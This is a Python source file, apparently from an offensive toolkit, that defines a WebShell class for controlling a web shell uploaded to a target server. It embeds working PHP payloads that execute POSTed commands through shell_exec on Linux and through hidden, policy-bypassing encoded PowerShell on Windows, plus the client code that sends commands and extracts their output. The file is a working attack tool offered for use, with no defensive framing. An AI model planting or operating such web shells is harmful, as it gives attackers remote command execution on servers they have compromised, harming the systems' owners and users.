import requests
import urllib.parse, base64
from shells.shell import Shell

class WebShell(Shell):
    '''Class for interacting with an uploaded webshell'''
    LINUX_CODE = '''%%%<?php echo shell_exec(urldecode($_POST["c"])." <&0 2>&1"); ?>%%%'''
    WINDOWS_CODE = '''%%%<?php echo shell_exec('powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand '.urldecode($_POST["c"])); ?>%%%'''
    CMD_ARG = 'c'
    DELIM = r'%%%'

    def __init__(self, target: str, os: str, url: str):
        self.url = url
        super().__init__(target, os)
    
    # Use `curl -X POST -d "c=whoami" http://<target>` for manual use
    def cmd(self, cmd: str, print_r = False) -> bool:
        '''Run a command in the shell'''
        # Send command to webshell
        try:
            if self.os == 'linux':
                r = requests.post(self.url, {self.CMD_ARG: urllib.parse.quote(cmd)})
            else:
                encoded_cmd = base64.b64encode(cmd.encode('utf-16le')).decode()
                r = requests.post(self.url, {self.CMD_ARG: urllib.parse.quote(encoded_cmd)})
        except requests.exceptions.ConnectionError:
            self.error(self.target, 'Connection error')
            return False
        
        # Check that command was successful
        if r.status_code != 200:
            self.error(self.target, 'Response code was ' + str(r.status_code))
            return False
        else:
            # Print result of command
            if print_r:
                start = r.text.find(self.DELIM)
                end = r.text.find(self.DELIM, start + 1)
                if start != -1 and end != -1:
                    self.print_output(r.text[start + len(self.DELIM):end].strip('\n'))
                else:
                    self.print_output(r.text.strip('\n'))
        return True
    
    def kill(self):
        '''Close the shell'''
        pass